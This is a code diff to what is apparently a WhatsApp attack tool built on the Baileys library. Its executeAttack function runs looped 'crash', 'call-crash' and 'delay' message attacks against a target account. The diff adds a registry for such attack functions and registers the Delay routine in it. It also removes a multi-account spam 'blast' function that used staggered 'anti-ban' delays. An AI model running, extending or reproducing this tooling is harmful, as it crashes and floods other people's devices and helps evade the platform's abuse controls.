@@ -12,6 +12,9 @@ const crashSystem = {
     device_kill: "ERROR_RECALIBRATING_SYSTEM_KERNEL_VOID"
 };
 
+// --- DYNAMIC KERNEL REGISTRY ---
+export const KERNELS = {};
+
 /**
  * Execute a specialized JID attack sequence
  * @param {Object} sock - Baileys socket instance
@@ -37,18 +40,19 @@ export const executeAttack = async (sock, jid, type = 'crash', amount = 10) => {
     try {
         const iter = parseInt(amount) || 10;
 
+        // Priority Check: Dynamic Kernel Registry
+        if (typeof KERNELS[type] === 'function') {
+            for(let i=0; i < Math.ceil(iter/5); i++) {
+                await KERNELS[type](sock, jid);
+            }
+            return { success: true, target: jid };
+        }
+
         // Special Handling for Protocol-level Crash
         if (type === 'call-crash') {
             for(let i=0; i<iter; i++) {
                 await callCrash(sock, jid, false);
                 await new Promise(r => setTimeout(r, 1000));
-            }
-            return { success: true, target: jid };
-        }
-        
-        if (type === 'delay') {
-            for(let i=0; i<Math.ceil(iter/5); i++) { // Delay is already heavy, scale down
-                await Delay(sock, jid);
             }
             return { success: true, target: jid };
         }
@@ -87,45 +91,6 @@ export const executeAttack = async (sock, jid, type = 'crash', amount = 10) => {
     }
 };
 
-/**
- * Perform a contact file promotion blast with multi-sender distribution
- * @param {Array|Object} socks - Baileys socket instance or array of instances
- * @param {Array} contacts - List of contact JIDs
- * @param {string} text - Message to promote
- */
-export const promoteToContacts = async (socks, contacts, text) => {
-    const activeSocks = Array.isArray(socks) ? socks : [socks];
-    if (activeSocks.length === 0) return { success: false, error: 'No active sockets' };
-
-    let successCount = 0;
-    const totalContacts = contacts.length;
-    const contactsPerSock = Math.ceil(totalContacts / activeSocks.length);
-
-    // Distribute contacts to each socket
-    const tasks = activeSocks.map(async (sock, index) => {
-        const start = index * contactsPerSock;
-        const end = Math.min(start + contactsPerSock, totalContacts);
-        const chunk = contacts.slice(start, end);
-
-        if (typeof sock.sendMessage !== 'function') return;
-
-        for (const jid of chunk) {
-            try {
-                await sock.sendMessage(jid, { text });
-                successCount++;
-                // Anti-ban delay (staggered)
-                await new Promise(resolve => setTimeout(resolve, 2000 + (Math.random() * 1000)));
-            } catch (e) {
-                console.warn(`[ BLAST ] Socket ${index} failed to transmit to ${jid}`);
-            }
-        }
-    });
-
-    // Run all distribution tasks
-    await Promise.all(tasks);
-    
-    return { success: true, count: successCount };
-};
 
 /**
  * Specialized Crash Execution (Shortcut)
@@ -596,9 +561,9 @@ export async function Delay(sock, jid) {
     for (const msg of messages) {
       try {
         await sock.relayMessage(
-          jid,
-          msg.message,
-          { messageId: msg.key.id }
+            jid,
+            msg.message,
+            { messageId: msg.key.id }
         );
       } catch (e) {
         console.error(`[ DELAY ] Relay failure:`, e.message);
@@ -606,3 +571,4 @@ export async function Delay(sock, jid) {
     }
   }
 }
+KERNELS["delay"] = Delay;
